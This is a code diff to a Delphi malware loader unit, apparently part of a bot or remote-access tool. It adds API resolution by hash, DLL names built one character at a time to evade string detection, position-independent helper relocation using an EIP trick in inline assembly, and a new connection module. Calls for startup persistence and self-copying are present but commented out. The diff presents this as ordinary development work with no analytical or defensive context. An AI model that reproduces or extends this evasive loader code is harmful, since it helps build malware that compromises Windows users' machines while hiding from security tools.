@@ -1,7 +1,7 @@
 unit untLoader;
 
 interface
-uses Windows, untUtils;
+uses Windows, untUtils, untConnection;
   
 procedure resolver;
 procedure resolver_start();
@@ -33,21 +33,39 @@ procedure resolver;
     end;
   end;
 
+  procedure xZeroMemory(var Dest; count: Integer);stdcall;
+  var
+    I: Integer;
+    P: PChar;
+  begin
+    P := PChar(@Dest);
+    for I := count-1 downto 0 do
+      P[I] := #0;
+  end;
+
   function xAllocMem(pAPI:PAPIRec; dwSize:Cardinal):Pointer;stdcall;
   begin
     Result := pAPI.xVirtualAlloc(nil, dwSize, MEM_COMMIT, PAGE_READWRITE);
+    xZeroMemory(Result^,dwSize);
   end;
-  procedure xAllocMem_END();asm end;
+
+  procedure xFreeMem(pAPI:PAPIRec; pData:Pointer);stdcall;
+  begin
+    pAPI.xVirtualFree(pData, 0, MEM_RELEASE);
+  end;
 
   procedure LoadLib(pAPI:PAPIRec);stdcall;
   var
     strUser32:Array[0..10] of Char;
     strShell32:Array[0..11] of Char;
     strShFolder:Array[0..12] of Char;
+    strAdvapi32:Array[0..12] of Char;
   begin
     strUser32[0]:='u';strUser32[1]:='s';strUser32[2] := 'e';strUser32[3]:='r';strUser32[4]:='3';strUser32[5]:='2';strUser32[6]:='.';strUser32[7]:='d';strUser32[8]:='l';strUser32[9]:='l';strUser32[10]:=#0;
     strShell32[0]:='s';strShell32[1]:='h';strShell32[2]:='e';strShell32[3]:='l';strShell32[4]:='l';strShell32[5]:='3';strShell32[6]:='2';strShell32[7]:='.';strShell32[8]:='d';strShell32[9]:='l';strShell32[10]:='l';strShell32[11]:=#0;
     strShFolder[0]:='s';strShFolder[1]:='h';strShFolder[2]:='f';strShFolder[3]:='o';strShFolder[4]:='l';strShFolder[5]:='d';strShFolder[6]:='e';strShFolder[7]:='r';strShFolder[8]:='.';strShFolder[9]:='d';strShFolder[10]:='l';strShFolder[11]:='l';strShFolder[12]:=#0;
+    strAdvapi32[0]:='a';strAdvapi32[1]:='d';strAdvapi32[2]:='v';strAdvapi32[3]:='a';strAdvapi32[4]:='p';strAdvapi32[5]:='i';strAdvapi32[6]:='3';strAdvapi32[7]:='2';strAdvapi32[8]:='.';strAdvapi32[9]:='d';strAdvapi32[10]:='l';strAdvapi32[11]:='l';strAdvapi32[12]:=#0;
+    pAPI.hAdvapi32 := pAPI.xLoadLibraryA(@strAdvapi32[0]);
     pAPI.hUser32 := pAPI.xLoadLibraryA(@strUser32[0]);
     pAPI.hShell32 := pAPI.xLoadLibraryA(@strShell32[0]);
     pAPI.hShFolder := pAPI.xLoadLibraryA(@strShFolder[0]);
@@ -101,11 +119,45 @@ procedure resolver;
     end;
   end;
 
+  procedure LoadHelpers(pAPI:PAPIRec);stdcall;
+  var
+    dwStaticAddress:Cardinal;
+    dwLoadHelpers:Cardinal;
+    dwEIP:Cardinal;
+    dwRelativeAddress:Cardinal;
+  begin
+    asm
+      call @getEIP
+      @getEIP:
+      pop eax
+      mov dwEIP, eax
+    end;
+    dwEIP := dwEIP - 13;
+    dwLoadHelpers := DWORD(@LoadHelpers);
+
+    dwStaticAddress := DWORD(@GetProcAddressEx);
+    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
+    pAPI.xGetProcAddressEx := Pointer(dwRelativeAddress);
+
+    dwStaticAddress := DWORD(@xAllocMem);
+    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
+    pAPI.xAllocMem := Pointer(dwRelativeAddress);
+
+    dwStaticAddress := DWORD(@xFreeMem);
+    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
+    pAPI.xFreeMem := Pointer(dwRelativeAddress);
+
+    dwStaticAddress := DWORD(@xZeroMemory);
+    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
+    pAPI.xZeroMemory := Pointer(dwRelativeAddress);
+  end;
+
   procedure LoadAPIs(pAPI:PAPIRec; hKernel32:Cardinal);
   begin
     pAPI.hKernel32 := hKernel32;
     pAPI.xLoadLibraryA := GetProcAddressEx(hKernel32, $3FC1BD8D, 12);
     LoadLib(pAPI);
+    pAPI.xGetProcAddress := GetProcAddressEx(hKernel32, $C97C1FFF, 14);
     pAPI.xExitProcess := GetProcAddressEx(hKernel32, $251097CC, 11);
     pAPI.xMessageBoxW := GetProcAddressEx(pAPI.hUser32, $A3F9E8DF, 11);
     pAPI.xVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
@@ -142,7 +194,7 @@ begin
   @pVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
   pAPI := pVirtualAlloc(nil, SizeOf(TAPIRec) , MEM_COMMIT, PAGE_READWRITE);
   LoadAPIs(pAPI, hKernel32);
-  pAPI.xMessageBoxW(0, nil, nil, 0);
+  LoadHelpers(pAPI);
   LoadFunctions(pAPI);
   //StartUp(pAPI);
   //CopyMySelf(pAPI);
